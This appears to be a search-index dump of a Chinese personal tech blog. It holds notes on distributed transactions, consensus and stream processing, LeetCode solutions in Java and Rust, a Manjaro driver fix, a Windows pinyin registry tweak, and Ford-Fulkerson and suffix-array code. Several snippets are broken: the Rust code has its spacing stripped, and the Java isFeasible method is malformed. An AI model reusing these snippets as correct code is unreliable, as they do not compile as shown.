引入了一个新组件：协调者。 当程序准备提交事务时，协调者开始阶段 1：发送一个准备请求到所有节点，询问他们是否可以提交。协调者然后跟踪参与者的回应： 如果所有参与者回答“是”，那么协调者接下来在阶段 2 会发出提交请求。 否则，协调者发送放弃请求。 实践中的分布式事务 目前有两种截然不同的分布式事务的概念： 数据库内部的分布式事务 所有参与者节点都运行着相同的数据库软件 异构分布式事务 不同的系统、数据库软件 Exactly-once 消息处理 通过自动提交消息和消息处理的结果，可以确保消息可以有效处理有且仅有一次 XA 交易 XA 是异构环境下实施两阶段提交的一个工业标准。XA 并不是一个网络协议，而是一个与事务协调者进行通信的 C API,也支持其他语言绑定。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:9:4","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"支持容错的共识 必须满足以下性质： 协商一致性 所有节点都接受相同的决议 诚实性 所有节点不能反悔 合法性 如果决定了值 v,则 v 一定是由某个节点提议的 可中止性 节点如果不崩溃则最终一定可以达成协议 共识算法与全序广播 最著名的容错式算法包括 VSR,Paxos,Raft,Zab。他们是决定了一系列值，然后采用全序关系广播算法。 全序关系广播算法的要点是，消息按照相同的顺序发送到所有节点，有且仅有一次。这相当于进行了多轮的共识：在每一轮，节点提出他们想要发送的消息，然后决定下一个消息的全局顺序。 主从复制与共识 目前所讨论的所有共识协议在其内部都使用了某种形式的主节点，虽然主节点并不是固定的，相反，他们都采用了一种弱化的保证：协议定义了一个世代编号（epoch number），并保证在每个世代里，主节点是唯一确定的。 如果发现当前的主节点失效，节点就开始一轮投票选举新的主节点。选举会赋予一个单调递增的 epoch 号。如果出现了两个不同的主节点对应于不同的 epoch 号，则具有更高 epoch 号的主节点将获胜。 在主节点做出任何决定前，它必须首先检查是否存在比它更高的 epoch 号。 它必须从 quorum 节点中收集投票，quoram 通常由多数节点组成。只有当没有发现更高 epoch 主节点存在时，节点才会对当前的提议进行投票。 因此，实际有两轮投票：首先投票决定谁是主节点，然后是对主节点的提议投票。关键一点是，参与两轮的 quoram 必须有重叠。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:9:5","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第十章 批处理系统 分布式批处理框架需要解决的两个主要问题是： 分区 在 MapReduce 中，mapper 根据输入的文件进行分区，mapper 的输出被重新分区、排序，合并成一个可配置数量的 reducer 分区。这个过程的目的是把所有的相关数据（如关键字）都放在同一个地方。除非必要，后 MapReduce 的数据流引擎都尽量避免排序，但它们采取了大致类似的分区方法。 容错 MapReduce 需要频繁的写入磁盘，这使得可以从单个失败任务中轻松恢复，而无需重新启动整个作业，但在无故障情况下则会减慢执行速度。数据流引擎执行较少的中间状态实体化并保留更多的内存，这意味着如果节点出现故障，他们需要重新计算更多的数据。确定性运算符减少了需要重新计算的数据量。 MapReduce 的 join 算法： 排序-合并 join 每个将要 join 的输入都会由一个 join 关键字的 mapper 来处理。通过分区、排序与合并，具有相同关键字的所有记录最终都会进入对 reducer 的同一个调用。然后这个函数输出 join 记录。 广播哈希 join 两个 join 输入中的某一个数据集很小，所以不需要分区，而完全加载到哈希表中。因此，可以为大数据集的每个分区启动一个 mapper,将小数据集的哈希表加载到每个 mapper 中，然后一次扫描大数据集的一条记录，对每条记录进行哈希表查询。 分区哈希 jion 如果两个 join 的输入以相同的方式分区（相同的关键字，哈希函数，相同数量的分区），则哈希表方法可以独立用于每个分区 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:10:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第十一章 流处理系统 三种类型的 join 流和流 join 两个输入都由活动事件组成，采用 join 操作用来搜索在特定事件窗口内发生的相关事件。例如两个 join 可以是相同的流。 流和表 join 一个输入由活动事件组成，另一个是数据库变更日志。变更日志维护了数据库的本地最新副本。对于每个活动事件，join 操作用来查询数据库并输出一个包含更多信息的事件 表和表 join 两个输入流都是数据库更新日志。在这种情况下，一方的每一个变化都与另一方的最新状态 join.结果是两个表之间 join 的物化视图进行持续的更新。 ","date":"2020-09-19","objectID":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/:11:0","tags":null,"title":"数据密集型应用系统设计笔记","uri":"/2020/09/%E6%95%B0%E6%8D%AE%E5%AF%86%E9%9B%86%E5%9E%8B%E5%BA%94%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"第 387 题：字符串中的第一个唯一字符 给定一个字符串，找到它的第一个不重复的字符，并返回它的索引。如果不存在，则返回 -1 。 案例: s = \"leetcode\" 返回 0. s = \"loveleetcode\", 返回 2. 注意事项： 您可以假定该字符串只包含小写字母。 java: public int firstUniqChar(String s) { int[] arr = new int[26]; //先记录每个字符最后一次出现的引索 for (int i = 0; i \u003c s.length(); i++) { arr[s.charAt(i) - 'a'] = i; } //如果第一次引索和记录的不一样说明有重复 for (int i = 0; i \u003c s.length(); i++) { if (arr[s.charAt(i)-'a'] != i) { arr[s.charAt(i)-'a'] = -1; } else { return i; } } return -1; } rust: pubfn first_uniq_char(s: String)-\u003e i32 {letmutarr=[0i32;26];for(i,c)ins.char_indices(){arr[casusize-'a'asusize]=iasi32;}for(i,c)ins.char_indices(){ifiasi32!=arr[casusize-'a'asusize]{arr[casusize-'a'asusize]=-1;}else{returniasi32;}}-1} ","date":"2020-08-31","objectID":"/2020/08/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%94%AF%E4%B8%80%E5%AD%97%E7%AC%A6/:0:0","tags":null,"title":"字符串中的第一个唯一字符","uri":"/2020/08/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%94%AF%E4%B8%80%E5%AD%97%E7%AC%A6/"},{"categories":null,"content":"今天不小心删除了显卡的驱动，导致开机进不去系统。以下是解决方法： 1.CTRL+ALT+F3 进入 tty,输入用户名和密码登陆。 2. 安装驱动 sudo mhwd -a pci nonfree 0300 3.删除/etx/X11/xorg.conf,/etx/X11/xorg.conf.d ","date":"2020-08-30","objectID":"/2020/08/manjaro%E5%88%A0%E9%99%A4%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%BF%9B%E4%B8%8D%E5%8E%BB%E6%A1%8C%E9%9D%A2%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/:0:0","tags":null,"title":"Manjaro删除显卡驱动进不去桌面解决方法","uri":"/2020/08/manjaro%E5%88%A0%E9%99%A4%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%BF%9B%E4%B8%8D%E5%8E%BB%E6%A1%8C%E9%9D%A2%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"categories":null,"content":"首先打开注册表，找到这个路径 计算机计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\InputMethod\\Settings\\CHS 然后新建一个名为 UserDefinedDoublePinyinScheme0的字符串值，数值数据为 小鹤双拼*2*^*iuvdjhcwfg^xmlnpbksqszxkrltvyovt 然后找到微软拼音的配置页面，把新出现的小鹤双拼设置为默认值。设置默认模式为英文。 直接修改注册表的最大意义在于，不需要自己一个个去定义按键和音节的对应关系了。 (可选)设置不让所有程序窗口共用输入法（时间和语言 → 语言 → 键盘）。 ","date":"2020-08-29","objectID":"/2020/08/win10%E5%BE%AE%E8%BD%AF%E6%8B%BC%E9%9F%B3%E6%B7%BB%E5%8A%A0%E5%B0%8F%E9%B9%A4%E5%8F%8C%E6%8B%BC%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE/:0:0","tags":null,"title":"Win10微软拼音添加小鹤双拼以及其他配置","uri":"/2020/08/win10%E5%BE%AE%E8%BD%AF%E6%8B%BC%E9%9F%B3%E6%B7%BB%E5%8A%A0%E5%B0%8F%E9%B9%A4%E5%8F%8C%E6%8B%BC%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE/"},{"categories":["leetcode"],"content":"第 350 题：两个数组的交集 给定两个数组，编写一个函数来计算它们的交集。 ","date":"2020-08-20","objectID":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/:1:0","tags":null,"title":"两个数组的交集","uri":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/"},{"categories":["leetcode"],"content":"示例 1: 输入: nums1 = [1,2,2,1], nums2 = [2,2] 输出: [2,2] ","date":"2020-08-20","objectID":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/:1:1","tags":null,"title":"两个数组的交集","uri":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/"},{"categories":["leetcode"],"content":"示例 2: 输入: nums1 = [4,9,5], nums2 = [9,4,9,8,4] 输出: [4,9] 说明： 输出结果中每个元素出现的次数，应与元素在两个数组中出现的次数一致。 我们可以不考虑输出结果的顺序。 进阶: 如果给定的数组已经排好序呢？将如何优化你的算法呢？ ","date":"2020-08-20","objectID":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/:1:2","tags":null,"title":"两个数组的交集","uri":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/"},{"categories":["leetcode"],"content":"分析 首先拿到这道题，我们基本马上可以想到，此题可以看成是一道传统的映射题（map 映射），为什么可以这样看呢，因为我们需找出两个数组的交集元素，同时应与两个数组中出现的次数一致。这样就导致了我们需要知道每个值出现的次数，所以映射关系就成了\u003c元素,出现次数\u003e。剩下的就是顺利成章的解题。 //方法一，用map public int[] intersect(int[] nums1, int[] nums2) { Map\u003cInteger, Integer\u003e map = new HashMap\u003c\u003e(); for (int i : nums1) { int count = map.getOrDefault(i, 0); map.put(i, count + 1); } int k = 0; for (int i : nums2) { int count = map.getOrDefault(i, 0); if (count \u003e 0) { nums2[k++] = i; map.put(i, count - 1); } } return Arrays.copyOfRange(nums2, 0, k); } 对于两个已经排序好数组的题，我们可以很容易想到使用双指针的解法: 如果两个指针的元素不相等，我们将小的一个指针后移,直到任意一个数组终止。 //方法二：如果排好序 public int[] intersect2(int[] nums1, int[] nums2) { Arrays.sort(nums1); Arrays.sort(nums2); int i = 0, j = 0, k = 0; while (i \u003c nums1.length \u0026\u0026 j \u003c nums2.length) { if (nums1[i] == nums2[j]) { nums1[k] = nums1[i]; i++; j++; k++; } else if (nums1[i] \u003e nums2[j]) { j++; } else { i++; } } return Arrays.copyOfRange(nums1,0,k); } ","date":"2020-08-20","objectID":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/:1:3","tags":null,"title":"两个数组的交集","uri":"/2020/08/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/"},{"categories":["leetcode"],"content":"题目 14: 最长公共前缀 编写一个函数来查找字符串数组中的最长公共前缀。如果不存在公共前缀，则返回\"\" ","date":"2020-08-20","objectID":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/:1:0","tags":null,"title":"最长公共前缀","uri":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/"},{"categories":["leetcode"],"content":"示例 1: 输入: [\"flower\",\"flow\",\"flight\"] 输出: \"fl\" ","date":"2020-08-20","objectID":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/:1:1","tags":null,"title":"最长公共前缀","uri":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/"},{"categories":["leetcode"],"content":"示例 2: 输入: [\"dog\",\"racecar\",\"car\"] 输出: \"\" 解释:输入不存在公共前缀。 说明： 所有输入只包含小写字母 a-z ","date":"2020-08-20","objectID":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/:1:2","tags":null,"title":"最长公共前缀","uri":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/"},{"categories":["leetcode"],"content":"分析 我们要想寻找最长公共前缀，那么首先这个前缀是公共的，我们可以从任意一个元素中找到它。那么首先，我们可以将第一个元素设置为基准元素 x0。假如数组为[\"flow\",\"flower\",\"flight\"]，flow 就是我们的基准元素 x0。 然后我们只需要依次将基准元素和后面的元素进行比较（假定后面的元素依次为 x1,x2,x3....），不断更新基准元素(截取掉基准元素最后一个元素)，直到基准元素和所有元素都满足最长公共前缀的条件，就可以得到最长公共前缀。 public String longestCommonPrefix(String[] strs) { if (strs.length == 0) return \"\"; String prefix = strs[0]; for (String str : strs) { while (str.indexOf(prefix) != 0) { if (prefix.length() \u003c= 0) return \"\"; prefix = prefix.substring(0, prefix.length() - 1); } } return prefix; } pubfn longest_common_prefix(strs: Vec\u003cString\u003e)-\u003e String {ifstrs.is_empty(){return\"\".to_string();}letmutprefix=\u0026strs[0][..];forstrinstrs.iter(){while!str.starts_with(prefix){ifprefix.len()==0{return\"\".to_string();}prefix=\u0026prefix[0..prefix.len()-1];}}prefix.into()} ","date":"2020-08-20","objectID":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/:2:0","tags":null,"title":"最长公共前缀","uri":"/2020/08/%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80/"},{"categories":["剑指offer","leetcode"],"content":"请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。 思路：和上一题相比，只用最后 reverse 一下 list 就可以了 /** * 例如: * 给定二叉树：[3,9,20,null,null,15,7], * \u003cp\u003e * 3 * / \\ * 9 20 * / \\ * 15 7 * 返回其层次遍历结果： * \u003cp\u003e * [ * [3], * [20,9], * [15,7] * ] */ public List\u003cList\u003cInteger\u003e\u003e levelOrder(TreeNode root) { boolean left2right = true; List\u003cList\u003cInteger\u003e\u003e res = new ArrayList\u003c\u003e(); Queue\u003cTreeNode\u003e queue = new ArrayDeque\u003c\u003e(); if (root != null) queue.add(root); while (!queue.isEmpty()) { List\u003cInteger\u003e list = new ArrayList\u003c\u003e(); for (int i = queue.size(); i \u003e 0; i--) { TreeNode node = queue.poll(); list.add(node.val); if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); } if (left2right) { res.add(list); } else { Collections.reverse(list); res.add(list); } left2right = !left2right; } return res; } class TreeNode { int val; TreeNode left; TreeNode right; TreeNode(int x) { val = x; } } ","date":"2020-08-18","objectID":"/2020/08/32_3/:0:0","tags":null,"title":"32_3","uri":"/2020/08/32_3/"},{"categories":["算法"],"content":"定义 流量网络：一个流量网络是一张边的权重（这里称为容量）为正的加权有向图。一个 st-流量网络有两个已知的顶点，即起点 s 和终点 t 流量配置：由一组和每条边相关的值组成的集合，这个值被称为边的流量。如果所有边的流量均小于边的容量且满足每个顶点的局部平衡（即净流量均为 0，s 和 t 除外），那么就称这种流量配置方案是可行的。 ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:1:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"检查流量网络中的一种流量配置是否可行 private boolean localEq(FlowNetwork G,int v){ double EPSILON = 1E-11; double netflow = 0.0; for (FlowEdge e: G.adj(v)){ if (v == e.from()) netflow -= e.flow(); else netflow += e.flow(); } return Math.abs(netflow) \u003c EPSILON; } private boolean isFeasible(FlowNetwork G){ for (int v = 0; v \u003c G.V(); v++){ for(e.flow() \u003c 0 || e.flow() \u003e e.capacity()) return false; } for (int v = 0; v \u003c G.V(); v++) if (v != s \u0026\u0026 v != t \u0026\u0026 !localEq(v)) return false; return true; } ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:2:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"Ford-Fulkerson 最大流量算法 网络中的初始流量为零，沿着任意从起点到终点（且不含有饱和的长相边或者是空的逆向边）的增广路径增大流量，知道网络中不存在这样的路径为止。 ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:3:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"最大流-最小切分定义 ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:4:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"定义 st-切分是一个将顶点 s 和顶点 t 分配于不同集合中的切分。 一个 st-切分的容量为该切分的 st-边的容量之和 st-切分的跨切分流量为该切分的 st-边的流量之和于 ts-边的流量之和的差 最小 st-切分：给定一个 st-网络，找到容量最小的 st-切分 ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:4:1","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"定理 对于任意 st-流量网络，每种 st-切分中的跨切分流量都和总流量的值相等 s 的流出量等于 t 的流入量（即 st-流量网络的值） st-流量网络的值不可能超过任意 st-切分的容量 令 f 为一个 st-流量网络，一下三种条件是等价的： 存在某个 st-切分，其容量和 f 的流量相等 f 达到了最大流量 f 中已经不存在任何蹭广路径 当所有容量均为整数时，存在一个整数值的最大流量，而 Ford-Fulkerson 算法能够找出这个最大值 ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:4:2","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"剩余网络 ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:5:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"定义 给定某个 st-流量网络和其 st-流量配置，这种配置下的剩余网络中的顶点和原网络相同。原网络中的每条边都对应着剩余网络中的 1~2 条边。它的定义如下：对于原网络中的每条从顶点 v 到 w 的边 e，令$f_x$ 表示它的流量，$c_e$表示它的容量。如果$f_e$为正，将w-\u003ev加入剩余网络且容量为$f_e$；如果$f_e$小于$c_e$，将 w-\u003ew 加入剩余网络且容量为$c_e-f_e$ ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:5:1","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"网络流量中的边（剩余网络） public class FlowEdge { private final int v; private final int w; private final double capacity; private double flow; public FlowEdge(int v, int w, double capacity){ ... } public int from(){return v;} public int to(){return w;} public double capacity(){return capacity;} public double flow(){return flow;} public int other(int vertex){ return vertex == v ? w : v; } public double residualCapacityTo(int vertex){ if (vertex == v) return flow; else if (vertex == w) return capacity -flow; else throw new RuntimeException(\"Inconsistent dege\"); } public void addResidualFlowTo(int vertex,double delta){ if (vertex == v) flow -= delta; else if (vertex == w) flow += delta; else throw new RuntimeException(\"Inconsistent dege\"); } } ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:6:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"FordFulkerson 实现 public class FordFulkerson{ private boolean[] marked; private FlowEdge[] edgeTo; private double value; public FordFulkerson(FlowNetwork G,int s,int t){ while (hasAugmentingPath(G, s, t)) { // 计算瓶颈 double bottle = Double.POSITIVE_INFINITY; for (int v = t; v != s; v = edgeTo[v].other(v)) { bottle = Math.min(bottle, edgeTo[v].residualCapacityTo(v)); } // 增大流量 for (int v = t; v != s; v = edgeTo[v].other(v)) { edgeTo[v].addResidualFlowTo(v, bottle); } value += bottle; } } public double value() { return value; } //返回true如果v属于最小切分 public boolean inCut(int v) { return marked[v]; } private boolean hasAugmentingPath(FlowNetwork G, int s, int t) { edgeTo = new FlowEdge[G.V()]; marked = new boolean[G.V()]; // breadth-first search Queue\u003cInteger\u003e queue = new Queue\u003cInteger\u003e(); queue.enqueue(s); marked[s] = true; while (!queue.isEmpty() \u0026\u0026 !marked[t]) { int v = queue.dequeue(); for (FlowEdge e : G.adj(v)) { int w = e.other(v); // if residual capacity from v to w if (e.residualCapacityTo(w) \u003e 0 \u0026\u0026 !marked[w]) { edgeTo[w] = e; marked[w] = true; queue.enqueue(w); } } } // is there an augmenting path? return marked[t]; } public static void main(String[] args) { // create flow network with V vertices and E edges int V = Integer.parseInt(args[0]); int E = Integer.parseInt(args[1]); int s = 0, t = V-1; FlowNetwork G = new FlowNetwork(V, E); StdOut.println(G); // compute maximum flow and minimum cut FordFulkerson maxflow = new FordFulkerson(G, s, t); StdOut.println(\"Max flow from \" + s + \" to \" + t); for (int v = 0; v \u003c G.V(); v++) { for (FlowEdge e : G.adj(v)) { if ((v == e.from()) \u0026\u0026 e.flow() \u003e 0) StdOut.println(\" \" + e); } } // print min-cut StdOut.print(\"Min cut: \"); for (int v = 0; v \u003c G.V(); v++) { if (maxflow.inCut(v)) StdOut.print(v + \" \"); } StdOut.println(); StdOut.println(\"Max flow value = \" + maxflow.value()); } } ","date":"2020-08-18","objectID":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/:7:0","tags":["算法"],"title":"网络流量算法","uri":"/2020/08/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E7%AE%97%E6%B3%95/"},{"categories":["算法"],"content":"定义 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:1:0","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"字符串 字符串s连续的一段字符组成的串叫做字符串，更广义地，任何一个由可比较大小的元素组成的数组都可称为字符串。字符串的下标从0开始，长度为length(s) ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:1:1","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"后缀 suffix(i)表示字符串从s第i个位置开始的后缀，即由s[i]~s[n-1]组成的子串 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:1:2","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"后缀数组 sa[]是一个一维数组，保存了字符串s的所有后缀排序后的结果 rank[]是一个一维数组，保存了每个后缀在sa[]中的排名，rank[i]表示suffix(i)的排名，即rank[sa[i]]=i height[]是一个一维数组，保存了相邻两个后缀的最长公共前缀（Longest Common Prefix,lcp）的长度 ","date":"2020-08-15","objectID":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/:1:3","tags":["SA-IS"],"title":"后缀数组及SA-IS算法笔记","uri":"/2020/08/%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84%E5%8F%8Asa-is%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"},{"categories":["算法"],"content":"一个简单的实现 public String longestDupSubstring(String S) { int n=S.length(); String[] sa=new String[n]; for (int i=0;i\u003cn;i++){ sa[i]=S.substring(i); } Arrays.sort(sa); String max=\"\"; for (int i=1;i\u003cn;i++){ int len=lcp(sa[i-1],sa[i]); if (len\u003emax.length()) max=sa[i].substring(0,len); } return max; } static int lcp(String a,String b){ int n =Math.min(a.length(),b.length()); for (int i=0;i\u003cn;i++){ if (a.charAt(i)!=b.charAt(i)) return i; } return n; } int n, k; const int MAXN = 100005; int rank[MAXN + 1]; int tmp[MAXN + 1]; int sa[MAXN], lcp[MAXN]; bool compare_sa(int i, int j) { if (rank[i] != rank[j]) return rank[i] \u003c rank[j]; else { int ri = i + k \u003c= n ? rank[i + k] : -1; int rj = j + k \u003c= n ? rank[j + k] : -1; return ri \u003c rj; } } void construct_sa(std::string S, int *sa) { n = S.length(); //初始化长度为1，rank直接取字符的编码 for (int i = 0; i \u003c= n; ++i) { sa[i] = i; rank[i] = i \u003c n ? S[i] : -1; } //利用对长度为k的排序结果对长度为2k排序 for (k = 1; k \u003c= n; k *=2) { std::sort(sa, sa + n + 1, compare_sa); //现在tmp临时存储新计算的rank，再转存回rank中 tmp[sa[0]] = 0; for (int i = 1; i \u003c= n; ++i) { tmp[sa[i]] = tmp[sa[i - 1]] + (compare_sa(sa[i - 1], sa[i]) ? 1 : 0); } for (int i = 0; i \u003c= n; ++i) { rank[i] = tmp[i]; } } } void construct_lcp(std::string S, int *sa, int *lcp) { int n = S.length(); for (int i = 0; i \u003c= n; ++i) { rank[sa[i]] = i; } int h = 0; lcp[0] = 0; for (int i = 0; i \u003c n; ++i) { int j = sa[rank[i] - 1]; if (h \u003e 0) h--; for (; j + h \u003c n \u0026\u0026 i + h \u003c n; ++h) { if (S[j + h] != S[i + h]) break; } lcp[rank[i] ] = h; } } std::string longestDupSubstring(std::string S) { construct_sa(S,sa); construct_lcp(S,sa,lcp); for (int i = 0; i \u003c= n; ++i) { std::cout\u003c\u003clcp[i]; } std::cout\u003c\u003c\"\\n\"; int len=0,p=-1; for (int i = 0; i \u003c= n; ++i) { if (lcp[rank[i]]\u003elen){ len=lcp[rank[i]]; p=i; } } if (p==-1) return \"\"; else return S.substr(p,len); } 